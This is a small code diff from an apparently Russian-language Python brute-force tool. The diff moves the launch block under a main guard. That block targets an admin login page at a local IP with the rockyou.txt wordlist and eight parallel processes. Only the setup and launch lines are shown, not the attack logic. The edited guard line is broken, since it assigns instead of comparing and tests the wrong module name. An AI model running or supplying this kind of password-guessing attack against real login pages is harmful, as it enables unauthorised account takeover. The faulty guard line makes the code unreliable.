@@ -92,10 +92,10 @@ class BruteForceAttack:
             print(f"[-] Атака завершена без успеха за {elapsed_time:.2f} секунд.")
 
 
-
-AUTH_URL = "http://192.168.0.12/index.php"
-PASSWORDS_FILE = "rockyou.txt"
-ADMIN_USERNAME = "admin"
-
-brute_force = BruteForceAttack(AUTH_URL, PASSWORDS_FILE, ADMIN_USERNAME, num_processes=8, batch_size=100000)
-brute_force.run()
+if __name__ = "main":
+    AUTH_URL = "http://192.168.0.12/index.php"
+    PASSWORDS_FILE = "rockyou.txt"
+    ADMIN_USERNAME = "admin"
+    
+    brute_force = BruteForceAttack(AUTH_URL, PASSWORDS_FILE, ADMIN_USERNAME, num_processes=8, batch_size=100000)
+    brute_force.run()
